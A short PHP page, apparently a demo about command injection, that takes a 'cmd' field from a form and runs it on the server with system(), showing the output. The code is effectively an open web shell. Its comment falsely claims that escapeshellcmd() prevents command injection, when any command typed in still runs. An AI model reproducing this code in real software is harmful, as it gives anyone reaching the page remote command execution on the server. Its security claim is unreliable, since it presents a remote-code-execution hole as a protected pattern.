<?php

if ($_SERVER["REQUEST_METHOD"] === 'POST') {

    //Evita command injection utilizando caracteres de escape
    $cmd =  escapeshellcmd($_POST["cmd"]);

    var_dump($cmd);

    echo "<pre>";

    $command = system($cmd, $return);

    echo "</pre>";
}
?>

<form method="POST">

    <input type="text" name="cmd">
    <button type="submit">Enviar</button>

</form>